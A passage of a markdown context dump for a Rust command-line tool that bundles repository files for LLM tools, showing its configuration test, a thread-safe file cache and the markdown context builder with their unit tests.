        let config_file = ConfigFile {
            defaults: Defaults {
                max_tokens: Some(75000),
                llm_tool: Some("gemini".to_string()),
                progress: true,
                verbose: false,
                quiet: false,
                directory: None,
                output_file: None,
            },
            tokens: TokenLimits {
                gemini: Some(2_500_000),
                codex: Some(1_800_000),
            },
            priorities: vec![],
            ignore: vec![],
            include: vec![],
        };

        let mut cli_config = CliConfig {
            prompt: None,
            paths: Some(vec![PathBuf::from(".")]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        config_file.apply_to_cli_config(&mut cli_config);

        // Token limits should be stored but not directly applied to max_tokens
        assert_eq!(cli_config.config_defaults_max_tokens, Some(75000)); // From defaults
        assert!(cli_config.config_token_limits.is_some());
        let token_limits = cli_config.config_token_limits.as_ref().unwrap();
        assert_eq!(token_limits.gemini, Some(2_500_000));
        assert_eq!(token_limits.codex, Some(1_800_000));
    }
}
```

## src/core/cache.rs

Imports: anyhow::Result, dashmap::DashMap, std, std::sync::Arc, tests, super::*, std::fs, tempfile::TempDir, std::sync::Arc as StdArc, std::thread

Imported by: cache.rs

Type references: dashmap::DashMap.DashMap, FileCache, dashmap::DashMap.DashMap, dashmap::DashMap.DashMap, dashmap::DashMap.DashMap, std.PathBuf, FileCache, Self, Self, FileCache, std.Path, std.Path, CacheStats, CacheStats, CacheStats, Default, FileCache, Self, Self, CacheStats, fs, tempfile::TempDir.TempDir, thread

```rust
//! File caching functionality for eliminating redundant I/O
//!
//! This module provides a thread-safe cache for file contents using `Arc<str>`
//! for cheap cloning across threads.

use anyhow::Result;
use dashmap::DashMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;

/// Thread-safe file content cache
pub struct FileCache {
    cache: DashMap<PathBuf, Arc<str>>,
}

impl FileCache {
    /// Create a new empty cache
    pub fn new() -> Self {
        FileCache {
            cache: DashMap::new(),
        }
    }

    /// Get file content from cache or load from disk
    pub fn get_or_load(&self, path: &Path) -> Result<Arc<str>> {
        // Canonicalize path to avoid cache misses from different representations
        let canonical_path = path.canonicalize()?;

        // Check if already cached
        if let Some(content) = self.cache.get(&canonical_path) {
            return Ok(content.clone());
        }

        // Load from disk
        let content = std::fs::read_to_string(&canonical_path)?;
        let arc_content: Arc<str> = Arc::from(content.as_str());

        // Store in cache
        self.cache.insert(canonical_path, arc_content.clone());

        Ok(arc_content)
    }

    /// Get cache statistics
    pub fn stats(&self) -> CacheStats {
        CacheStats {
            entries: self.cache.len(),
        }
    }
}

impl Default for FileCache {
    fn default() -> Self {
        Self::new()
    }
}

/// Cache statistics
#[derive(Debug, Clone)]
pub struct CacheStats {
    pub entries: usize,
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn test_cache_hit_returns_same_content() {
        let temp_dir = TempDir::new().unwrap();
        let file_path = temp_dir.path().join("test.txt");
        let content = "Hello, cache!";
        fs::write(&file_path, content).unwrap();

        let cache = FileCache::new();

        // First access - cache miss
        let content1 = cache.get_or_load(&file_path).unwrap();
        assert_eq!(&*content1, content);

        // Second access - cache hit
        let content2 = cache.get_or_load(&file_path).unwrap();
        assert_eq!(&*content2, content);

        // Should be the same Arc
        assert!(Arc::ptr_eq(&content1, &content2));
    }

    #[test]
    fn test_cache_miss_loads_from_disk() {
        let temp_dir = TempDir::new().unwrap();
        let file_path = temp_dir.path().join("test.txt");
        let content = "Content from disk";
        fs::write(&file_path, content).unwrap();

        let cache = FileCache::new();
        let loaded = cache.get_or_load(&file_path).unwrap();

        assert_eq!(&*loaded, content);
        assert_eq!(cache.stats().entries, 1);
    }

    #[test]
    fn test_non_existent_file_returns_error() {
        let temp_dir = TempDir::new().unwrap();
        let file_path = temp_dir.path().join("does_not_exist.txt");

        let cache = FileCache::new();
        let result = cache.get_or_load(&file_path);

        assert!(result.is_err());
        assert_eq!(cache.stats().entries, 0);
    }

    #[test]
    fn test_canonicalized_paths() {
        let temp_dir = TempDir::new().unwrap();
        let file_path = temp_dir.path().join("test.txt");
        fs::write(&file_path, "content").unwrap();

        let cache = FileCache::new();

        // Access with different path representations
        let _content1 = cache.get_or_load(&file_path).unwrap();
        let relative_path =
            PathBuf::from(".").join(file_path.strip_prefix("/").unwrap_or(&file_path));

        // This might fail on canonicalization, which is fine
        if let Ok(content2) = cache.get_or_load(&relative_path) {
            // If it succeeds, should still only have one entry
            assert_eq!(cache.stats().entries, 1);
            assert_eq!(&*content2, "content");
        }
    }

    #[test]
    fn test_concurrent_access() {
        use std::sync::Arc as StdArc;
        use std::thread;

        let temp_dir = TempDir::new().unwrap();
        let file_path = temp_dir.path().join("concurrent.txt");
        fs::write(&file_path, "concurrent content").unwrap();

        let cache = StdArc::new(FileCache::new());
        let mut handles = vec![];

        // Spawn multiple threads accessing the same file
        for _ in 0..10 {
            let cache_clone = cache.clone();
            let path_clone = file_path.clone();

            let handle = thread::spawn(move || {
                let content = cache_clone.get_or_load(&path_clone).unwrap();
                assert_eq!(&*content, "concurrent content");
            });

            handles.push(handle);
        }

        // Wait for all threads
        for handle in handles {
            handle.join().unwrap();
        }

        // Should only have one cache entry
        assert_eq!(cache.stats().entries, 1);
    }
}
```

## src/core/context_builder.rs

Imports: crate::core::cache::FileCache, crate::core::walker::FileInfo, crate::utils::file_ext::FileType, anyhow::Result, std::collections::HashMap, std::path::Path, std::sync::Arc, std, tests, super::*, std::path::PathBuf, crate::cli::Config, tempfile::TempDir, config

Type references: crate::core::cache::FileCache.FileCache, crate::core::walker::FileInfo.FileInfo, crate::utils::file_ext::FileType.FileType, std::path::Path.Path, ContextOptions, ContextOptions, crate::cli::Config.Config, Self, ContextOptions, Default, ContextOptions, Self, Self, ContextOptions, crate::core::walker::FileInfo.FileInfo, ContextOptions, ContextOptions, crate::core::cache::FileCache.FileCache, crate::core::cache::FileCache.FileCache, crate::core::walker::FileInfo.FileInfo, ContextOptions, ContextOptions, crate::core::cache::FileCache.FileCache, crate::core::walker::FileInfo.FileInfo, crate::core::walker::FileInfo.FileInfo, ContextOptions, ContextOptions, crate::core::cache::FileCache.FileCache, crate::core::cache::FileCache.FileCache, crate::core::walker::FileInfo.FileInfo, crate::utils::file_ext::FileType.FileType, _, crate::core::walker::FileInfo.FileInfo, ContextOptions, ContextOptions, TreeNode, std.BTreeMap, std.BTreeMap, std.BTreeMap, TreeNode, crate::core::walker::FileInfo.FileInfo, _, TreeNode, TreeNode, crate::core::walker::FileInfo.FileInfo, ContextOptions, ContextOptions, crate::core::walker::FileInfo.FileInfo, crate::utils::file_ext::FileType.FileType, crate::core::walker::FileInfo.FileInfo, crate::utils::file_ext::FileType.FileType, crate::core::walker::FileInfo.FileInfo, _, crate::utils::file_ext::FileType.FileType, crate::utils::file_ext::FileType.FileType, crate::utils::file_ext::FileType.FileType, crate::utils::file_ext::FileType.FileType, crate::utils::file_ext::FileType.FileType, crate::utils::file_ext::FileType.FileType, std::path::Path.Path, std::path::Path.Path, std::path::PathBuf.PathBuf, crate::core::cache::FileCache.FileCache, crate::cli::Config.Config, tempfile::TempDir.TempDir, crate::cli::Config.Config, ContextOptions, crate::core::walker::FileInfo.FileInfo, crate::utils::file_ext::FileType.FileType, std::path::PathBuf.PathBuf, ContextOptions, crate::core::walker::FileInfo.FileInfo, crate::utils::file_ext::FileType.FileType, std::path::PathBuf.PathBuf, ContextOptions, crate::core::walker::FileInfo.FileInfo, crate::utils::file_ext::FileType.FileType, std::path::PathBuf.PathBuf, ContextOptions

```rust
//! Context creation functionality for LLM consumption

use crate::core::cache::FileCache;
use crate::core::walker::FileInfo;
use crate::utils::file_ext::FileType;
use anyhow::Result;
use std::collections::HashMap;
use std::path::Path;
use std::sync::Arc;

/// Options for generating context for LLM consumption
#[derive(Debug, Clone)]
pub struct ContextOptions {
    /// Maximum tokens allowed in the output
    pub max_tokens: Option<usize>,
    /// Include file tree in output
    pub include_tree: bool,
    /// Include token count statistics
    pub include_stats: bool,
    /// Group files by type
    pub group_by_type: bool,
    /// Sort files by priority
    pub sort_by_priority: bool,
    /// Template for file headers
    pub file_header_template: String,
    /// Template for the document header
    pub doc_header_template: String,
    /// Include table of contents
    pub include_toc: bool,
    /// Enable enhanced context with file metadata
    pub enhanced_context: bool,
}

impl ContextOptions {
    /// Create ContextOptions from CLI config
    pub fn from_config(config: &crate::cli::Config) -> Result<Self> {
        Ok(ContextOptions {
            max_tokens: config.get_effective_context_tokens(),
            include_tree: true,
            include_stats: true,
            group_by_type: false,
            sort_by_priority: true,
            file_header_template: "## {path}".to_string(),
            doc_header_template: "# Code Context: {directory}".to_string(),
            include_toc: true,
            enhanced_context: config.enhanced_context,
        })
    }
}

impl Default for ContextOptions {
    fn default() -> Self {
        ContextOptions {
            max_tokens: None,
            include_tree: true,
            include_stats: true,
            group_by_type: false,
            sort_by_priority: true,
            file_header_template: "## {path}".to_string(),
            doc_header_template: "# Code Context: {directory}".to_string(),
            include_toc: true,
            enhanced_context: false,
        }
    }
}

/// Estimate the total size of the markdown output
fn estimate_output_size(files: &[FileInfo], options: &ContextOptions, cache: &FileCache) -> usize {
    let mut size = 0;

    // Document header
    if !options.doc_header_template.is_empty() {
        size += options.doc_header_template.len() + 50; // Extra for replacements and newlines
    }

    // Statistics section
    if options.include_stats {
        size += 500; // Estimated size for stats
        size += files.len() * 50; // For file type listing
    }

    // File tree
    if options.include_tree {
        size += 100; // Headers
        size += files.len() * 100; // Estimated per-file in tree
    }

    // Table of contents
    if options.include_toc {
        size += 50; // Header
        size += files.len() * 100; // Per-file TOC entry
    }

    // File contents
    for file in files {
        // Header template
        size +=
            options.file_header_template.len() + file.relative_path.to_string_lossy().len() + 20;

        // File content + code fence
        if let Ok(content) = cache.get_or_load(&file.path) {
            size += content.len() + 20; // Content + fence markers
        } else {
            size += file.size as usize; // Fallback to file size
        }
    }

    // Add 20% buffer for formatting and unexpected overhead
    size + (size / 5)
}

/// Generate markdown from a list of files
pub fn generate_markdown(
    files: Vec<FileInfo>,
    options: ContextOptions,
    cache: Arc<FileCache>,
) -> Result<String> {
    // Pre-allocate string with estimated capacity
    let estimated_size = estimate_output_size(&files, &options, &cache);
    let mut output = String::with_capacity(estimated_size);

    // Add document header
    if !options.doc_header_template.is_empty() {
        let header = options.doc_header_template.replace("{directory}", ".");
        output.push_str(&header);
        output.push_str("\n\n");
    }

    // Add statistics if requested
    if options.include_stats {
        let stats = generate_statistics(&files);
        output.push_str(&stats);
        output.push_str("\n\n");
    }

    // Add file tree if requested
    if options.include_tree {
        let tree = generate_file_tree(&files, &options);
        output.push_str("## File Structure\n\n");
        output.push_str("```\n");
        output.push_str(&tree);
        output.push_str("```\n\n");
    }

    // Sort files if requested
    let mut files = files;
    if options.sort_by_priority {
        files.sort_by(|a, b| {
            b.priority
                .partial_cmp(&a.priority)
                .unwrap_or(std::cmp::Ordering::Equal)
                .then_with(|| a.relative_path.cmp(&b.relative_path))
        });
    }

    // Add table of contents if requested
    if options.include_toc {
        output.push_str("## Table of Contents\n\n");
        for file in &files {
            let anchor = path_to_anchor(&file.relative_path);
            output.push_str(&format!(
                "- [{path}](#{anchor})\n",
                path = file.relative_path.display(),
                anchor = anchor
            ));
        }
        output.push('\n');
    }

    // Group files if requested
    if options.group_by_type {
        let grouped = group_files_by_type(files);
        for (file_type, group_files) in grouped {
            output.push_str(&format!("## {} Files\n\n", file_type_display(&file_type)));
            for file in group_files {
                append_file_content(&mut output, &file, &options, &cache)?;
            }
        }
    } else {
        // Add all files
        for file in files {
            append_file_content(&mut output, &file, &options, &cache)?;
        }
    }

    Ok(output)
}

/// Append a single file's content to the output
fn append_file_content(
    output: &mut String,
    file: &FileInfo,
    options: &ContextOptions,
    cache: &FileCache,
) -> Result<()> {
    // Read file content from cache
    let content = match cache.get_or_load(&file.path) {
        Ok(content) => content,
        Err(e) => {
            eprintln!(
                "Warning: Could not read file {}: {}",
                file.path.display(),
                e
            );
            return Ok(());
        }
    };

    // Add file header with optional metadata
    let path_with_metadata = if options.enhanced_context {
        format!(
            "{} ({}, {})",
            file.relative_path.display(),
            format_size(file.size),
            file_type_display(&file.file_type)
        )
    } else {
        file.relative_path.display().to_string()
    };

    let header = options
        .file_header_template
        .replace("{path}", &path_with_metadata);
    output.push_str(&header);
    output.push_str("\n\n");

    // Add semantic information if available
    if !file.imports.is_empty() {
        output.push_str("Imports: ");
        let import_names: Vec<String> = file
            .imports
            .iter()
            .map(|p| {
                let filename = p.file_name().and_then(|n| n.to_str()).unwrap_or("");

                // For Python __init__.py files, use the parent directory name
                if filename == "__init__.py" {
                    p.parent()
                        .and_then(|parent| parent.file_name())
                        .and_then(|n| n.to_str())
                        .unwrap_or("unknown")
                        .to_string()
                } else {
                    // Remove common extensions
                    filename
                        .strip_suffix(".py")
                        .or_else(|| filename.strip_suffix(".rs"))
                        .or_else(|| filename.strip_suffix(".js"))
                        .or_else(|| filename.strip_suffix(".ts"))
                        .unwrap_or(filename)
                        .to_string()
                }
            })
            .collect();
        output.push_str(&format!("{}\n\n", import_names.join(", ")));
    }

    if !file.imported_by.is_empty() {
        output.push_str("Imported by: ");
        let imported_by_names: Vec<String> = file
            .imported_by
            .iter()
            .map(|p| {
                p.file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or_else(|| p.to_str().unwrap_or("unknown"))
                    .to_string()
            })
            .collect();
        output.push_str(&format!("{}\n\n", imported_by_names.join(", ")));
    }

    if !file.function_calls.is_empty() {
        output.push_str("Function calls: ");
        let function_names: Vec<String> = file
            .function_calls
            .iter()
            .map(|fc| {
                if let Some(module) = &fc.module {
                    format!("{}.{}", module, fc.name)
                } else {
                    fc.name.clone()
                }
            })
            .collect();
        output.push_str(&format!("{}\n\n", function_names.join(", ")));
    }

    if !file.type_references.is_empty() {
        output.push_str("Type references: ");
        let type_names: Vec<String> = file
            .type_references
            .iter()
            .map(|tr| {
                if let Some(module) = &tr.module {
                    format!("{}.{}", module, tr.name)
                } else {
                    tr.name.clone()
                }
            })
            .collect();
        output.push_str(&format!("{}\n\n", type_names.join(", ")));
    }

    // Add language hint for syntax highlighting
    let language = get_language_hint(&file.file_type);
    output.push_str(&format!("```{language}\n"));
    output.push_str(&content);
    if !content.ends_with('\n') {
        output.push('\n');
    }
    output.push_str("```\n\n");

    Ok(())
}

/// Generate statistics about the files
fn generate_statistics(files: &[FileInfo]) -> String {
    let total_files = files.len();
    let total_size: u64 = files.iter().map(|f| f.size).sum();

    // Count by file type
    let mut type_counts: HashMap<FileType, usize> = HashMap::new();
    for file in files {
        *type_counts.entry(file.file_type.clone()).or_insert(0) += 1;
    }

    // Pre-allocate with estimated capacity
    let mut stats = String::with_capacity(500 + type_counts.len() * 50);
    stats.push_str("## Statistics\n\n");
    stats.push_str(&format!("- Total files: {total_files}\n"));
    stats.push_str(&format!(
        "- Total size: {} bytes\n",
        format_size(total_size)
    ));
    stats.push_str("\n### Files by type:\n");

    let mut types: Vec<_> = type_counts.into_iter().collect();
    types.sort_by_key(|(_, count)| std::cmp::Reverse(*count));

    for (file_type, count) in types {
        stats.push_str(&format!("- {}: {}\n", file_type_display(&file_type), count));
    }

    stats
}

/// Generate a file tree representation
fn generate_file_tree(files: &[FileInfo], options: &ContextOptions) -> String {
    use std::collections::{BTreeMap, HashMap};

    #[derive(Default)]
    struct TreeNode {
        files: Vec<String>,
        dirs: BTreeMap<String, TreeNode>,
    }

    let mut root = TreeNode::default();

    // Create a lookup map from relative path to FileInfo for metadata
    let file_lookup: HashMap<String, &FileInfo> = files
        .iter()
        .map(|f| (f.relative_path.to_string_lossy().to_string(), f))
        .collect();

    // Build tree structure
    for file in files {
        let parts: Vec<_> = file
            .relative_path
            .components()
            .map(|c| c.as_os_str().to_string_lossy().to_string())
            .collect();

        let mut current = &mut root;
        for (i, part) in parts.iter().enumerate() {
            if i == parts.len() - 1 {
                // File
                current.files.push(part.clone());
            } else {
                // Directory
                current = current.dirs.entry(part.clone()).or_default();
            }
        }
    }

    // Render tree
    #[allow(clippy::too_many_arguments)]
    fn render_tree(
        node: &TreeNode,
        prefix: &str,
        _is_last: bool,
        current_path: &str,
        file_lookup: &HashMap<String, &FileInfo>,
        options: &ContextOptions,
    ) -> String {
        // Pre-allocate with estimated size
        let estimated_size = (node.dirs.len() + node.files.len()) * 100;
        let mut output = String::with_capacity(estimated_size);

        // Render directories
        let dir_count = node.dirs.len();
        for (i, (name, child)) in node.dirs.iter().enumerate() {
            let is_last_dir = i == dir_count - 1 && node.files.is_empty();
            let connector = if is_last_dir {
                "â””â”€â”€ "
            } else {
                "â”œâ”€â”€ "
            };
            let extension = if is_last_dir { "    " } else { "â”‚   " };

            output.push_str(&format!("{prefix}{connector}{name}/\n"));
            let child_path = if current_path.is_empty() {
                name.clone()
            } else {
                format!("{current_path}/{name}")
            };
            output.push_str(&render_tree(
                child,
                &format!("{prefix}{extension}"),
                is_last_dir,
                &child_path,
                file_lookup,
                options,
            ));
        }

        // Render files
        let file_count = node.files.len();
        for (i, name) in node.files.iter().enumerate() {
            let is_last_file = i == file_count - 1;
            let connector = if is_last_file {
                "â””â”€â”€ "
            } else {
                "â”œâ”€â”€ "
            };

            let file_path = if current_path.is_empty() {
                name.clone()
            } else {
                format!("{current_path}/{name}")
            };

            // Include metadata if enhanced context is enabled
            let display_name = if options.enhanced_context {
                if let Some(file_info) = file_lookup.get(&file_path) {
                    format!(
                        "{} ({}, {})",
                        name,
                        format_size(file_info.size),
                        file_type_display(&file_info.file_type)
                    )
                } else {
                    name.clone()
                }
            } else {
                name.clone()
            };

            output.push_str(&format!("{prefix}{connector}{display_name}\n"));
        }

        output
    }

    // Pre-allocate output string
    let mut output = String::with_capacity(files.len() * 100 + 10);
    output.push_str(".\n");
    output.push_str(&render_tree(&root, "", true, "", &file_lookup, options));
    output
}

/// Group files by their type
fn group_files_by_type(files: Vec<FileInfo>) -> Vec<(FileType, Vec<FileInfo>)> {
    let mut groups: HashMap<FileType, Vec<FileInfo>> = HashMap::new();

    for file in files {
        groups.entry(file.file_type.clone()).or_default().push(file);
    }

    let mut result: Vec<_> = groups.into_iter().collect();
    result.sort_by_key(|(file_type, _)| file_type_priority(file_type));
    result
}

/// Get display name for file type
fn file_type_display(file_type: &FileType) -> &'static str {
    match file_type {
        FileType::Rust => "Rust",
        FileType::Python => "Python",
        FileType::JavaScript => "JavaScript",
        FileType::TypeScript => "TypeScript",
        FileType::Go => "Go",
        FileType::Java => "Java",
        FileType::Cpp => "C++",
        FileType::C => "C",
        FileType::CSharp => "C#",
        FileType::Ruby => "Ruby",
        FileType::Php => "PHP",
        FileType::Swift => "Swift",
        FileType::Kotlin => "Kotlin",
        FileType::Scala => "Scala",
        FileType::Haskell => "Haskell",
        FileType::Dart => "Dart",
        FileType::Lua => "Lua",
        FileType::R => "R",
        FileType::Julia => "Julia",
        FileType::Elixir => "Elixir",
        FileType::Elm => "Elm",
        FileType::Markdown => "Markdown",
        FileType::Json => "JSON",
        FileType::Yaml => "YAML",
        FileType::Toml => "TOML",
        FileType::Xml => "XML",
        FileType::Html => "HTML",
        FileType::Css => "CSS",
        FileType::Text => "Text",
        FileType::Other => "Other",
    }
}

/// Get language hint for syntax highlighting
fn get_language_hint(file_type: &FileType) -> &'static str {
    match file_type {
        FileType::Rust => "rust",
        FileType::Python => "python",
        FileType::JavaScript => "javascript",
        FileType::TypeScript => "typescript",
        FileType::Go => "go",
        FileType::Java => "java",
        FileType::Cpp => "cpp",
        FileType::C => "c",
        FileType::CSharp => "csharp",
        FileType::Ruby => "ruby",
        FileType::Php => "php",
        FileType::Swift => "swift",
        FileType::Kotlin => "kotlin",
        FileType::Scala => "scala",
        FileType::Haskell => "haskell",
        FileType::Dart => "dart",
        FileType::Lua => "lua",
        FileType::R => "r",
        FileType::Julia => "julia",
        FileType::Elixir => "elixir",
        FileType::Elm => "elm",
        FileType::Markdown => "markdown",
        FileType::Json => "json",
        FileType::Yaml => "yaml",
        FileType::Toml => "toml",
        FileType::Xml => "xml",
        FileType::Html => "html",
        FileType::Css => "css",
        FileType::Text => "text",
        FileType::Other => "",
    }
}

/// Get priority for file type ordering
fn file_type_priority(file_type: &FileType) -> u8 {
    match file_type {
        FileType::Rust => 1,
        FileType::Python => 2,
        FileType::JavaScript => 3,
        FileType::TypeScript => 3,
        FileType::Go => 4,
        FileType::Java => 5,
        FileType::Cpp => 6,
        FileType::C => 7,
        FileType::CSharp => 8,
        FileType::Ruby => 9,
        FileType::Php => 10,
        FileType::Swift => 11,
        FileType::Kotlin => 12,
        FileType::Scala => 13,
        FileType::Haskell => 14,
        FileType::Dart => 15,
        FileType::Lua => 16,
        FileType::R => 17,
        FileType::Julia => 18,
        FileType::Elixir => 19,
        FileType::Elm => 20,
        FileType::Markdown => 21,
        FileType::Json => 22,
        FileType::Yaml => 23,
        FileType::Toml => 24,
        FileType::Xml => 25,
        FileType::Html => 26,
        FileType::Css => 27,
        FileType::Text => 28,
        FileType::Other => 29,
    }
}

/// Convert path to anchor-friendly string
fn path_to_anchor(path: &Path) -> String {
    path.display()
        .to_string()
        .replace(['/', '\\', '.', ' '], "-")
        .to_lowercase()
}

/// Format file size in human-readable format
fn format_size(size: u64) -> String {
    const UNITS: &[&str] = &["B", "KB", "MB", "GB"];
    let mut size = size as f64;
    let mut unit_index = 0;

    while size >= 1024.0 && unit_index < UNITS.len() - 1 {
        size /= 1024.0;
        unit_index += 1;
    }

    if unit_index == 0 {
        format!("{} {}", size as u64, UNITS[unit_index])
    } else {
        format!("{:.2} {}", size, UNITS[unit_index])
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn create_test_cache() -> Arc<FileCache> {
        Arc::new(FileCache::new())
    }

    #[test]
    fn test_format_size() {
        assert_eq!(format_size(512), "512 B");
        assert_eq!(format_size(1024), "1.00 KB");
        assert_eq!(format_size(1536), "1.50 KB");
        assert_eq!(format_size(1048576), "1.00 MB");
    }

    #[test]
    fn test_path_to_anchor() {
        assert_eq!(path_to_anchor(Path::new("src/main.rs")), "src-main-rs");
        assert_eq!(path_to_anchor(Path::new("test file.txt")), "test-file-txt");
    }

    #[test]
    fn test_file_type_display() {
        assert_eq!(file_type_display(&FileType::Rust), "Rust");
        assert_eq!(file_type_display(&FileType::Python), "Python");
    }

    #[test]
    fn test_generate_statistics() {
        let files = vec![
            FileInfo {
                path: PathBuf::from("test1.rs"),
                relative_path: PathBuf::from("test1.rs"),
                size: 100,
                file_type: FileType::Rust,
                priority: 1.0,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("test2.py"),
                relative_path: PathBuf::from("test2.py"),
                size: 200,
                file_type: FileType::Python,
                priority: 0.9,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        ];

        let stats = generate_statistics(&files);
        assert!(stats.contains("Total files: 2"));
        assert!(stats.contains("Total size: 300 B"));
        assert!(stats.contains("Rust: 1"));
        assert!(stats.contains("Python: 1"));
    }

    #[test]
    fn test_generate_statistics_empty() {
        let files = vec![];
        let stats = generate_statistics(&files);
        assert!(stats.contains("Total files: 0"));
        assert!(stats.contains("Total size: 0 B"));
    }

    #[test]
    fn test_generate_statistics_large_files() {
        let files = vec![
            FileInfo {
                path: PathBuf::from("large.rs"),
                relative_path: PathBuf::from("large.rs"),
                size: 2_000_000, // 2MB
                file_type: FileType::Rust,
                priority: 1.0,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("huge.py"),
                relative_path: PathBuf::from("huge.py"),
                size: 50_000_000, // 50MB
                file_type: FileType::Python,
                priority: 0.9,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        ];

        let stats = generate_statistics(&files);
        assert!(stats.contains("Total files: 2"));
        assert!(stats.contains("MB bytes")); // Just check that it's in MB
        assert!(stats.contains("Python: 1"));
        assert!(stats.contains("Rust: 1"));
    }

    #[test]
    fn test_generate_file_tree_with_grouping() {
        let files = vec![
            FileInfo {
                path: PathBuf::from("src/main.rs"),
                relative_path: PathBuf::from("src/main.rs"),
                size: 1000,
                file_type: FileType::Rust,
                priority: 1.5,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("src/lib.rs"),
                relative_path: PathBuf::from("src/lib.rs"),
                size: 2000,
                file_type: FileType::Rust,
                priority: 1.2,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("tests/test.rs"),
                relative_path: PathBuf::from("tests/test.rs"),
                size: 500,
                file_type: FileType::Rust,
                priority: 0.8,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        ];

        let options = ContextOptions::default();
        let tree = generate_file_tree(&files, &options);
        assert!(tree.contains("src/"));
        assert!(tree.contains("tests/"));
        assert!(tree.contains("main.rs"));
        assert!(tree.contains("lib.rs"));
        assert!(tree.contains("test.rs"));
    }

    #[test]
    fn test_context_options_from_config() {
        use crate::cli::Config;
        use tempfile::TempDir;

        let temp_dir = TempDir::new().unwrap();
        let config = Config {
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            max_tokens: Some(100000),
            ..Config::default()
        };

        let options = ContextOptions::from_config(&config).unwrap();
        assert_eq!(options.max_tokens, Some(100000));
        assert!(options.include_tree);
        assert!(options.include_stats);
        assert!(!options.group_by_type); // Default is false according to implementation
    }

    #[test]
    fn test_generate_markdown_structure_headers() {
        let files = vec![];

        let options = ContextOptions {
            max_tokens: None,
            include_tree: true,
            include_stats: true,
            group_by_type: true,
            sort_by_priority: true,
            file_header_template: "## {path}".to_string(),
            doc_header_template: "# Code Context".to_string(),
            include_toc: true,
            enhanced_context: false,
        };

        let cache = create_test_cache();
        let markdown = generate_markdown(files, options, cache).unwrap();

        // Check that main structure is present even with no files
        assert!(markdown.contains("# Code Context"));
        assert!(markdown.contains("## Statistics"));
    }

    #[test]
    fn test_enhanced_tree_generation_with_metadata() {
        use crate::core::walker::FileInfo;
        use crate::utils::file_ext::FileType;
        use std::path::PathBuf;

        let files = vec![
            FileInfo {
                path: PathBuf::from("src/main.rs"),
                relative_path: PathBuf::from("src/main.rs"),
                size: 145,
                file_type: FileType::Rust,
                priority: 1.5,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("src/lib.rs"),
                relative_path: PathBuf::from("src/lib.rs"),
                size: 89,
                file_type: FileType::Rust,
                priority: 1.2,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        ];

        let options = ContextOptions {
            max_tokens: None,
            include_tree: true,
            include_stats: true,
            group_by_type: false,
            sort_by_priority: true,
            file_header_template: "## {path}".to_string(),
            doc_header_template: "# Code Context".to_string(),
            include_toc: true,
            enhanced_context: true,
        };

        let cache = create_test_cache();
        let markdown = generate_markdown(files, options, cache).unwrap();

        // Should include file sizes and types in tree
        assert!(markdown.contains("main.rs (145 B, Rust)"));
        assert!(markdown.contains("lib.rs (89 B, Rust)"));
    }

    #[test]
    fn test_enhanced_file_headers_with_metadata() {
        use crate::core::walker::FileInfo;
        use crate::utils::file_ext::FileType;
        use std::path::PathBuf;

        let files = vec![FileInfo {
            path: PathBuf::from("src/main.rs"),
            relative_path: PathBuf::from("src/main.rs"),
            size: 145,
            file_type: FileType::Rust,
            priority: 1.5,
            imports: Vec::new(),
            imported_by: Vec::new(),
            function_calls: Vec::new(),
            type_references: Vec::new(),
        }];

        let options = ContextOptions {
            max_tokens: None,
            include_tree: true,
            include_stats: true,
            group_by_type: false,
            sort_by_priority: true,
            file_header_template: "## {path}".to_string(),
            doc_header_template: "# Code Context".to_string(),
            include_toc: true,
            enhanced_context: true,
        };

        let cache = create_test_cache();
        let markdown = generate_markdown(files, options, cache).unwrap();

        // Should include metadata in file headers
        assert!(markdown.contains("## src/main.rs (145 B, Rust)"));
    }

    #[test]
    fn test_basic_mode_unchanged() {
        use crate::core::walker::FileInfo;
        use crate::utils::file_ext::FileType;
        use std::path::PathBuf;

        let files = vec![FileInfo {
            path: PathBuf::from("src/main.rs"),
            relative_path: PathBuf::from("src/main.rs"),
            size: 145,
            file_type: FileType::Rust,
            priority: 1.5,
            imports: Vec::new(),
            imported_by: Vec::new(),
            function_calls: Vec::new(),
            type_references: Vec::new(),
        }];

        let options = ContextOptions {
            max_tokens: None,
            include_tree: true,
            include_stats: true,
            group_by_type: false,
            sort_by_priority: true,
            file_header_template: "## {path}".to_string(),
            doc_header_template: "# Code Context".to_string(),
            include_toc: true,
            enhanced_context: false,
        };

        let cache = create_test_cache();
        let markdown = generate_markdown(files, options, cache).unwrap();

        // Should NOT include metadata - backward compatibility
        assert!(markdown.contains("## src/main.rs"));
        assert!(!markdown.contains("## src/main.rs (145 B, Rust)"));
        assert!(markdown.contains("main.rs") && !markdown.contains("main.rs (145 B, Rust)"));
    }
}
```

## src/core/file_expander.rs

